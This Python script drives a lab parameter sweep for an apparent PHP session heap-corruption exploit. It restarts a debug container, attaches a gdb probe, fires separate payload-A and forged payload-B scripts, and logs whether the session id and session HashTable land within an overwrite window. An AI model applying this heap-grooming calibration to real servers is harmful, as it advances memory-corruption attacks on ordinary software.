#!/usr/bin/env python3
"""sweep.py - PS(id) vs session HashTable sweep driver.

For each point: clean restart -> attach gdb probe -> warm-up -> payload A ->
payload B -> collect logs -> append a CSV row.

The driver does not reimplement payloads: it invokes make_payload_a.py,
warmup.py and b_forge.py with the calibrated parameters and parses the probe
log.

Requirements:
  * a debug build of the target PHP (-O1 -g3) with symbols, one worker;
  * the container name and URL below (or the matching flags/env);
  * docker access from the host that runs this script.

The container is restarted for every point, so all state is disposable.
"""

from __future__ import annotations

import argparse
import csv
import json
import os
import re
import socket
import subprocess
import sys
import time
from pathlib import Path

KIT_DIR = Path(__file__).resolve().parent
CONTAINER = os.environ.get('P2S_CONTAINER', 'p2s-lab')
URL = os.environ.get('P2S_URL', 'http://127.0.0.1:18080/index.php')
A_SCRIPT = os.environ.get('P2S_A', str(KIT_DIR / 'make_payload_a.py'))
WARMUP = os.environ.get('P2S_WARMUP', str(KIT_DIR / 'warmup.py'))
B_FORGE = os.environ.get('P2S_B', str(KIT_DIR / 'b_forge.py'))
GDB_SCRIPT = os.environ.get('P2S_GDB', str(KIT_DIR / 'psid_probe.gdb'))
OUTDIR = Path(os.environ.get('P2S_OUT', 'out'))


def _url_host_port():
    import urllib.parse
    p = urllib.parse.urlparse(URL)
    return p.hostname or '127.0.0.1', p.port or 80


CHUNK = 0x200000
MASK = ~(CHUNK - 1)
CAP = 8168


def sh(argv, timeout=180, check=False):
    return subprocess.run(argv, capture_output=True, text=True, timeout=timeout,
                          check=check)


def docker_exec(args, timeout=60):
    return sh(['docker', 'exec', CONTAINER] + args, timeout=timeout)


def restart():
    sh(['docker', 'restart', CONTAINER], timeout=60)
    host, port = _url_host_port()
    deadline = time.time() + 20
    while time.time() < deadline:
        try:
            s = socket.create_connection((host, port), timeout=0.5)
            s.close()
            return True
        except OSError:
            time.sleep(0.2)
    return False


def resolve_worker(timeout=8.0):
    deadline = time.time() + timeout
    last = 'sin master apache2'
    while time.time() < deadline:
        r = docker_exec(['ps', '-eo', 'pid=,ppid=,comm='])
        if r.returncode == 0:
            procs = []
            for line in r.stdout.splitlines():
                parts = line.split(None, 2)
                if len(parts) == 3:
                    try:
                        procs.append((int(parts[0]), int(parts[1]),
                                      parts[2].strip()))
                    except ValueError:
                        pass
            masters = [p for p in procs if p[2] == 'apache2' and p[1] == 0]
            if masters:
                master = min(masters)[0]
                kids = [p for p in procs if p[1] == master and
                        p[2] == 'apache2']
                if len(kids) == 1:
                    return kids[0][0], ''
                last = 'workers=%d' % len(kids)
        else:
            last = r.stderr.strip()
        time.sleep(0.2)
    return None, last


def start_gdb(pid):
    docker_exec(['rm', '-f', '/tmp/psid_probe.log'])
    r = sh(['docker', 'cp', GDB_SCRIPT, '%s:/tmp/psid_probe.gdb' % CONTAINER])
    if r.returncode != 0:
        return 'docker cp: %s' % r.stderr.strip()
    r = sh(['docker', 'exec', '-d', CONTAINER, 'gdb', '-q', '-batch', '-nx',
            '-p', str(pid), '-x', '/tmp/psid_probe.gdb'])
    if r.returncode != 0:
        return 'gdb start: %s' % r.stderr.strip()
    for _ in range(60):
        time.sleep(0.1)
        r = docker_exec(['cat', '/tmp/psid_probe.log'])
        if r.returncode == 0 and 'ATTACHED' in r.stdout:
            return ''
    return 'sin ATTACHED en el log'


def stop_gdb():
    docker_exec(['pkill', '-9', '-x', 'gdb'])
    time.sleep(0.2)


def run_req(argv, timeout=180):
    r = sh(argv, timeout=timeout)
    out = (r.stdout or '').strip().replace('\n', ' | ')
    return r.returncode, out[:200]


def read_bytes(path):
    try:
        return Path(path).read_bytes()
    except OSError:
        return b''


def parse_log(text):
    resets = []
    tracks = []
    for line in text.splitlines():
        m = re.search(r'RESET hit=\d+ id=(0x[0-9a-f]+) len=(-?\d+) send=(-?\d+) '
                      r'chunk=(0x[0-9a-f]+) page=(0x[0-9a-f]+)', line)
        if m:
            resets.append({'id': int(m.group(1), 16), 'len': int(m.group(2)),
                           'send': int(m.group(3))})
        m = re.search(r'TRACK hit=\d+ id=(0x[0-9a-f]+) ht=(0x[0-9a-f]+) '
                      r'ht_chunk=(0x[0-9a-f]+) ht_page=(0x[0-9a-f]+) delta=(-?\d+)',
                      line)
        if m:
            tracks.append({'id': int(m.group(1), 16), 'ht': int(m.group(2), 16),
                           'delta': int(m.group(5))})
    return resets, tracks


def point(label, warmup, S, X, K, KL, warm_len, csv_writer,
          F=0, NB=235, BL=15000, aq_n=0, aq_len=200, w64_len=0, w64_n=1):
    row = {'label': label, 'warmup': warmup, 'S': S, 'X': X, 'K': K,
           'KL': KL, 'warm_len': warm_len, 'F': F, 'NB': NB, 'BL': BL,
           'aq_n': aq_n, 'aq_len': aq_len, 'error': ''}
    if not restart():
        row['error'] = 'restart/timeout'
        csv_writer.writerow(row)
        return row
    pid, err = resolve_worker()
    if pid is None:
        row['error'] = err
        csv_writer.writerow(row)
        return row
    row['worker_pid'] = pid
    err = start_gdb(pid)
    if err:
        row['error'] = err
        stop_gdb()
        csv_writer.writerow(row)
        return row

    if warmup > 0:
        rc, out = run_req(['python3', WARMUP, URL, str(warmup)])
        row['warmup_rc'] = rc
        row['warmup_out'] = out
    env = os.environ.copy()
    env['WARM_LEN'] = str(warm_len)
    env['AQ_N'] = str(aq_n)
    env['AQ_LEN'] = str(aq_len)
    env['W64_LEN'] = str(w64_len)
    env['W64_N'] = str(w64_n)
    a_out = str(OUTDIR / ('%s.a.resp' % label))
    r = subprocess.run(['python3', A_SCRIPT, str(F), str(S), str(NB), str(BL),
                        str(X), str(K), str(KL), '103',
                        '--url', URL, '--out', a_out],
                       capture_output=True, text=True, timeout=180, env=env)
    row['a_rc'] = r.returncode
    row['a_out'] = (r.stdout or '').strip().replace('\n', ' | ')[:120]
    time.sleep(0.3)
    b_out = str(OUTDIR / ('%s.b.resp' % label))
    rc, out = run_req(['python3', B_FORGE, '--url', URL, '--n', '40',
                       '--bb1', '1048551', '--out', b_out,
                       '--d', os.environ.get('B_D', '1036288'),
                       '--read', os.environ.get('B_READ', '4000'),
                       '--fill', os.environ.get('B_FILL', '1037288')])
    row['b_rc'] = rc
    row['b_out'] = out
    time.sleep(0.5)
    stop_gdb()
    r = docker_exec(['cat', '/tmp/psid_probe.log'])
    log = r.stdout if r.returncode == 0 else ''
    (OUTDIR / ('%s.gdb.log' % label)).write_text(log)

    resets, tracks = parse_log(log)
    if resets:
        row['id'] = resets[-1]['id']
        row['id_len'] = resets[-1]['len']
        row['id_chunk'] = row['id'] & MASK
        row['id_page'] = row['id'] & (CHUNK - 1)
    if tracks:
        row['ht'] = tracks[-1]['ht']
        row['ht_chunk'] = row['ht'] & MASK
        row['ht_page'] = row['ht'] & (CHUNK - 1)
        row['delta'] = tracks[-1]['delta']
    if row.get('id') and row.get('ht'):
        idval = row['id'] + 0x18
        chunk_end = row['id_chunk'] + CHUNK
        window = chunk_end - idval
        row['window'] = window
        row['same_chunk'] = int(row['id_chunk'] == row['ht_chunk'])
        row['window_ok'] = int(row['ht'] >= idval and
                               (row['ht'] + 56 - idval) <= min(CAP, window))
    row['a_resp_len'] = len(read_bytes(str(OUTDIR / ('%s.a.resp' % label))))
    row['b_resp_len'] = len(read_bytes(str(OUTDIR / ('%s.b.resp' % label))))
    csv_writer.writerow(row)
    print(json.dumps(row, sort_keys=True))
    return row


def main():
    global CONTAINER, URL, A_SCRIPT, WARMUP, B_FORGE, GDB_SCRIPT, OUTDIR
    ap = argparse.ArgumentParser(
        description='PS(id) vs session HashTable sweep driver (lab only).')
    ap.add_argument('--container', default=CONTAINER,
                    help='docker container running the debug build')
    ap.add_argument('--url', default=URL, help='target URL')
    ap.add_argument('--outdir', default=str(OUTDIR),
                    help='output directory for logs, responses and CSV')
    ap.add_argument('--a-script', default=A_SCRIPT, help='payload A script')
    ap.add_argument('--warmup-script', default=WARMUP, help='warm-up script')
    ap.add_argument('--b-script', default=B_FORGE, help='payload B script')
    ap.add_argument('--gdb-script', default=GDB_SCRIPT, help='gdb probe')
    ap.add_argument('--label', default='point')
    ap.add_argument('--warmup', type=int, default=1500000)
    ap.add_argument('--F', type=int, default=0)
    ap.add_argument('--S', type=int, default=63)
    ap.add_argument('--NB', type=int, default=235)
    ap.add_argument('--BL', type=int, default=15000)
    ap.add_argument('--X', type=int, default=208)
    ap.add_argument('--K', type=int, default=4)
    ap.add_argument('--KL', type=int, default=4000)
    ap.add_argument('--warm-len', type=int, default=0)
    ap.add_argument('--aq-n', type=int, default=0)
    ap.add_argument('--aq-len', type=int, default=200)
    ap.add_argument('--w64-len', type=int, default=0)
    ap.add_argument('--w64-n', type=int, default=1)
    ap.add_argument('--csv', default=None,
                    help='CSV path (default: OUTDIR/sweep.csv)')
    ap.add_argument('--grid', action='store_true',
                    help='full grid: warmup x S x X')
    args = ap.parse_args()
    CONTAINER = args.container
    URL = args.url
    A_SCRIPT = args.a_script
    WARMUP = args.warmup_script
    B_FORGE = args.b_script
    GDB_SCRIPT = args.gdb_script
    OUTDIR = Path(args.outdir)
    OUTDIR.mkdir(parents=True, exist_ok=True)
    if args.csv is None:
        args.csv = str(OUTDIR / 'sweep.csv')
    fields = ['label', 'warmup', 'F', 'S', 'NB', 'BL', 'X', 'K', 'KL',
              'warm_len', 'aq_n', 'aq_len', 'worker_pid',
              'id', 'id_len', 'id_chunk', 'id_page', 'ht', 'ht_chunk',
              'ht_page', 'delta', 'window', 'same_chunk', 'window_ok',
              'a_rc', 'a_out', 'a_resp_len', 'b_rc', 'b_out', 'b_resp_len',
              'warmup_rc', 'warmup_out', 'error']
    points = []
    if args.grid:
        for warm in (0, 512000, 1000000, 1500000, 1900000):
            for s in (61, 63, 65):
                for x in (204, 208, 212):
                    points.append(dict(label='w%d_s%d_x%d' % (warm, s, x),
                                       warmup=warm, S=s, X=x, K=args.K,
                                       KL=args.KL, warm_len=args.warm_len,
                                       F=args.F, NB=args.NB, BL=args.BL,
                                       aq_n=args.aq_n, aq_len=args.aq_len,
                                       w64_len=args.w64_len,
                                       w64_n=args.w64_n))
    else:
        points.append(dict(label=args.label, warmup=args.warmup, S=args.S,
                           X=args.X, K=args.K, KL=args.KL,
                           warm_len=args.warm_len, F=args.F, NB=args.NB,
                           BL=args.BL, aq_n=args.aq_n, aq_len=args.aq_len,
                           w64_len=args.w64_len, w64_n=args.w64_n))
    new = not os.path.exists(args.csv)
    with open(args.csv, 'a', newline='') as f:
        w = csv.DictWriter(f, fieldnames=fields, extrasaction='ignore')
        if new:
            w.writeheader()
        for p in points:
            point(**p, csv_writer=w)
            f.flush()
    print('CSV', args.csv)


if __name__ == '__main__':
    main()
